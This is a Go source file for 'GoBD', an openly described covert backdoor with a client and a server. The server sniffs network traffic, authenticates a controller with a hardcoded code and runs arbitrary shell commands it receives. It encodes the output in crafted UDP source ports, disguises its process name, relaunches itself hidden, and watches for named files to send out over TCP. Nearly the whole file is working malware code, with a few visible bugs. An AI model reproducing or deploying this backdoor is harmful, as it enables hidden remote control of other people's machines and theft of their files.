package main
/* bdmain.go
PROGRAM: GoBD
AUTHOR: Ramzi Chennafi
DATE: October 18 2015
FUNCTIONS:
 main()
 SetProcessName(string) error
 intiateClient(ip string, port, lport int)
 grabOutput(serverConn *net.UDPConn) 
 intiateServer(iface string, port, lport int)
 handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int)
 executeServerCommand(data, ip string, port int)
 executeCommand(cmd, ip string, port int)
 sendEncryptedData(port int, data, ip string)
 checkError(err error) 
 GetLocalIP() string

ABOUT:
  bdmain.go is the central code body for the GoBD program. Contained within are all methods related to starting and stopping 
 the server and client. The communications are done using UDP  including packet sniffing to create backdoor communications. 
 All messages are encrypted using AES-256 and client to sever connections require authentication using the control code.

USAGE:
 Type GoBD --help. While authenticated type ?help for more info on client options. Requires a backdoor to connect to. These
 two programs can be used across any operating system, commands will be executed the same.
*/
import(
	"os"
	"time"
	"os/exec"
	"reflect"
	"io"
	"unsafe"
	"flag"
	"encoding/binary"
	"fmt"
	"strings"
	"strconv"
	"bufio"
	"github.com/google/gopacket/layers"
	"golang.org/x/crypto/ssh/terminal"
	"runtime"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
)

const passwd = "D"; //The authentication code
const MAX_PORT = 45535
const CLIENT = 1
const SERVER = 0
const SND_CMPLETE = 3414
const helpStr = "Client Usage Help\n" +"=================================\n" +
"EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
"Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"

var authenticatedAddr string //Currently authenticated address
var handle *pcap.Handle
var err error
var localip net.IP
var localmac net.HardwareAddr
var destmac net.HardwareAddr
var pType int
var i int
/* 
    FUNCTION: func main()
    RETURNS: Nothing
    
    ABOUT:
    The main loop of program execution. Allows for retreiving of flags and intiation of client / server.
*/
func main(){

	//SetProcessName("dnsp")

	//flags
	modePtr      := flag.String("mode", "client", "The mode of the application, may either be" +
		         " client or server. Defaults to client.")
	ipPtr        := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.")
	portPtr      := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.")
	interfacePtr := flag.String("iface", "wlan0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.")
	lPortPtr     := flag.Int("lport", 3321, "The port for the client to listen on.")
	hiddenPtr    := flag.String("visible", "true", "Determines whether the server will be hidden or not. true for visible and false for invisible.")
	dstMacPtr    := flag.String("dMac", "", "Destination mac of the outgoing connection.")
	//flags

	flag.Parse()

	destmac, _ = net.ParseMAC(*dstMacPtr)
	localip = GetLocalIP()
	localmac = GetLocalMAC(*interfacePtr)
	
	if *hiddenPtr == "false" && *modePtr == "server" {

		var procAttr os.ProcAttr 
		procAttr.Files = []*os.File{os.Stdin, nil, nil} 
		
		arguments := make([]string, 7)
		arguments[0] = ""
		arguments[1] = fmt.Sprintf("-mode=%s", *modePtr)
		arguments[2] = fmt.Sprintf("-ip=%s", *ipPtr)
		arguments[3] = fmt.Sprintf("-port=%d", *portPtr)
		arguments[4] = fmt.Sprintf("-iface=%s", *interfacePtr)
		arguments[5] = fmt.Sprintf("-lport=%d", *lPortPtr)
		arguments[6] = fmt.Sprint("-visible=invalid")
		if runtime.GOOS == "windows"{
			_, err := os.StartProcess("GoBD", arguments, &procAttr)
			checkError(err)
		} else {
			_, err := os.StartProcess("./GoBD", arguments, &procAttr)
			checkError(err)
		}
		return
	}

	intiateTools()
	
	handle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
	checkError(err)

	switch *modePtr {
	case "client":
		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr)
		pType = CLIENT
		intiateClient(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
		break
	case "server":
		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr)
		pType = SERVER
		beginListen(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
	}
}
/* 
    FUNCTION: func intiateClient(ip string, port, lport in)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                int lport : port to listen for data on

    ABOUT:
    Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
    server if correct. Then idles waiting for user input and server output. Also provides help documentation
*/
func intiateClient(ip string, port, lport uint16){
	
	for {
		fmt.Print("Please input the authentication code: ");
		var authstr string;
		if runtime.GOOS == "windows" {
			reader := bufio.NewReader(os.Stdin);
			authstr, _ := reader.ReadString('\n');
			authstr = strings.TrimSpace(authstr);
		} else {			
			authcode, _ := terminal.ReadPassword(0);
			authstr = string(authcode);
		}
		
		if authstr == passwd {
			sendAuthPacket(ip, authstr, port)
			break;
		}
		fmt.Print("\nInvalid authentication code, try again.\n");
	}
 
	fmt.Printf("Authentication accepted, you may now send commands.\n");
	fmt.Printf("Type ?help for more info on sending client commands.\n");

	go beginListen(ip, port, lport)
	
	for {
		reader := bufio.NewReader(os.Stdin);
		input, _ := reader.ReadString('\n');
		input = strings.TrimSpace(input);
		if strings.HasPrefix(input, "!") {
			sendEncryptedData(port, "[BD]" + input, ip);
			if strings.HasPrefix(input, "!monitor") {
				args := strings.Split(input, " ");
				go fileWait(ip, args[1], lport + 1)
			}
		} else if input == "?help" {
			fmt.Print(helpStr);
			continue;
		} else {
			sendEncryptedData(port, "[EXEC]" + input, ip);
		}
	}
}

func fileWait(ip, filename string, lport uint16){

	var addr string
	fmt.Sprintf(addr, "%s:%d", ip, lport)
	ln, _ := net.Listen("tcp", addr)

	connection, _ := ln.Accept()

	fileBuffer := make([]byte, 1000)
	var currentByte int64 = 0
	
	file, err := os.Create(strings.TrimSpace(filename))
	checkError(err)
	
	for {
		connection.Read(fileBuffer)
		_, err = file.WriteAt(fileBuffer, currentByte)

		currentByte += 1000

		if err == io.EOF {
			break
		}
	}
	
	file.Close()
}

func sendAuthPacket(ip, data string, port uint16){
	
	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	checkError(err);
	
	cryptdata := encrypt_data(data);
	_, err = conn.WriteToUDP([]byte(cryptdata), &net.UDPAddr{IP: net.ParseIP(ip), Port: int(port)})
	checkError(err);
}
func beginListen(ip string, port, lport uint16) {

	var ipLayer layers.IPv4
	var ethLayer layers.Ethernet
	var udpLayer layers.UDP

	i = 0
	buffer := make([]byte, 10000000)
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
	decoded := make([]gopacket.LayerType, 0, 3)
	
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		checkError(err)

		err = parser.DecodeLayers(packet.Data(), &decoded)
		if err != nil {
			continue
		}

		if len(decoded) != 3 {
			fmt.Println("Not enough layers!")
			continue
		}

		if pType == CLIENT {
			buffer = clientControl(uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), lport, buffer)
		} else {
			buffer = serverControl(uint16(udpLayer.SrcPort), ipLayer.SrcIP.String(), uint16(udpLayer.DstPort), port, lport, buffer, []byte(udpLayer.Payload))
		}
		
	}
}
func clientControl(val uint16, sIP string, port, lport uint16, buffer []byte) []byte{
	if sIP  == localip.String() && port == lport {
		curr_bytes := buffer[i:i + 1]
		binary.LittleEndian.PutUint16(curr_bytes, val)
		i = i + 2

		if(port == SND_CMPLETE){
			fmt.Print(buffer[:(len(buffer) - 1)])
			buffer = buffer[:0]
			i = 0
		}
	}

	return buffer
}

func serverControl(val uint16, sIP string, port, dport, lport uint16, buffer []byte, payload []byte) []byte{

	if sIP == authenticatedAddr {
		
		curr_bytes := buffer[i:i + 1]
		binary.LittleEndian.PutUint16(curr_bytes, val)
		i = i + 2
		
		if(port == SND_CMPLETE){
			data := decrypt_data(buffer[:(len(buffer)-1)])

			if strings.HasPrefix(data, "[EXEC]") {
				executeCommand(data, sIP, dport);
			}
			if strings.HasPrefix(data, "[BD]") {
				executeServerCommand(data, sIP, dport);
			}

			buffer = buffer[:0]
			i = 0
		}
	} else if port  == lport {
		
		data := decrypt_data([]byte(payload))

		if data == passwd {
			fmt.Printf("Authcode recieved, opening communication with %s\n", sIP);
			authenticatedAddr = sIP;
		}
	}
	
	return buffer
}
/* 
    FUNCTION: func  executeServerCommand(data, ip string, port int) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                string data : command to execute

    ABOUT:
    Executes incoming client commands on the GoBD program itself. Current commands include:
              setprocess [name] - sets the process name of the gobd program
              exit - exits the gobd program cleanly
*/
func executeServerCommand(data, ip string, port uint16) {

	fmt.Printf("%s\n", data);

	tempstr := strings.SplitAfterN(data, "[BD]!", 2);
	args := strings.Split(tempstr[1], " ");

	var out string;
	
	switch args[0] {
	case "setprocess" :
		err := SetProcessName(args[1]);
		if err != nil {
			fmt.Printf("%s\n", err);
			out = fmt.Sprintf("%s", err);
		} else {
			out = fmt.Sprintf("Process name set to %s\n", args[1]);
		}
		break;
		
	case "monitor":
		sendEncryptedData(port, "Monitoring for requested file\n", ip);
		go monitorFile(ip, args[1], port + 1);
		break;

	case "exit" :
		sendEncryptedData(port, "Server exiting...\n", ip);
		os.Exit(0);
		break;

	default:
		out = "Not a valid command.\n";
	}

	fmt.Printf("%s", out);

	sendEncryptedData(port, out, ip);	
}

func monitorFile(ip, filename string, port uint16){

	for {
		time.Sleep(1000 * time.Millisecond);
		_, err := os.Stat(filename)
		if os.IsNotExist(err) {
			continue;
		}

		var target string
		fmt.Sprintf(target, "%s:%d", ip, port)
		conn, _ := net.Dial("tcp", target)

		file, err := os.Open(strings.TrimSpace(filename)) // For read access.
		checkError(err)
		
		defer file.Close() // make sure to close the file even if we panic.

		_, err = io.Copy(conn, file)
		checkError(err)
		return
	}
}
/* 
    FUNCTION: func  executeCommand(cmd, ip string, port int) 
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                string cmd : command to execute

    ABOUT:
    Executes incoming client commands on the host machine.
*/
func executeCommand(cmd, ip string, port uint16){
	
	fmt.Printf("%s\n", cmd);

	tempstr := strings.SplitAfterN(cmd, "[EXEC]", 2);
	args := strings.Split(tempstr[1], " ");
	
	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
	fmt.Printf("OUT:\n%s", out);

	sendEncryptedData(port, string(out[:]), ip);
}
/* 
    FUNCTION: sendEncryptedData(port int, data, ip string)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to

    ABOUT:
    Sends encrypted data over UDP to the spcified port and ip.
*/
func sendEncryptedData(port uint16, data, ip string) {

	cryptdata := encrypt_data(data)
	size := len(cryptdata)
	//make data write to source port, continue till end
	for p := 0; i <= size; p = p + 2 {

		var buffer []byte
		
		if p == size {
			buffer = craftPacket("", ip, SND_CMPLETE);
		} else {
			buffer = craftPacket(string(cryptdata[p:(p+1)]), ip, port); 
		}
		
		if buffer == nil { // if original query was invalid
			fmt.Print("Buffer error, returned nil.\n")
			continue
		}

		err := handle.WritePacketData(buffer);
		checkError(err)
	}
}

func craftPacket(data, ip string, port uint16) []byte {

	ethernetLayer := &layers.Ethernet{}
	ipLayer       := &layers.IPv4{}
	udpLayer      := &layers.UDP{}

	ethernetLayer.SrcMAC = localmac 
	ethernetLayer.DstMAC = destmac
	
	ipLayer.SrcIP = GetLocalIP()
	ipLayer.DstIP = net.ParseIP(ip)

	code, _ := strconv.ParseUint(data, 10, 16)
	udpLayer.SrcPort = layers.UDPPort(MAX_PORT - code) 
	udpLayer.DstPort = layers.UDPPort(port)
	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
	checkError(err)
	
	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	};

	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer);
	checkError(err);

	return buf.Bytes()
}
///Utility Functions//////////////////////////////////////////
/* 
    FUNCTION: func checkError(err error)
    RETURNS: Nothing
    ARGUMENTS: 
              err error : the error code to check

    ABOUT:
    Checks an error code, panics if the error is not nil.
*/
func checkError(err error){
	if err != nil {
		panic(err)
	}
}
/* 
    FUNCTION: func SetProcessName(name string) error
    RETURNS: err Error, if anything goes wrong
    ARGUMENTS: 
                string name: the new process name to set the program to

    ABOUT:
    Sets the process name of the GoBD program to name.
*/
func SetProcessName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]));
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len];

    n := copy(argv0, name);
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}

/* 
    FUNCTION: func GetLocalIP() string
    RETURNS: String, the local ip 

    ABOUT:
    Grabs the local ip of the host system.
*/
func GetLocalIP() net.IP {
    addrs, err := net.InterfaceAddrs();
	checkError(err);
	
    for _, address := range addrs {
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP;
            }
        }
    }
	
    return nil;
}
func GetLocalMAC(iface string) (macAddr net.HardwareAddr){

	netInterface, err := net.InterfaceByName(iface)
	checkError(err)

	macAddr = netInterface.HardwareAddr
	return macAddr;
}
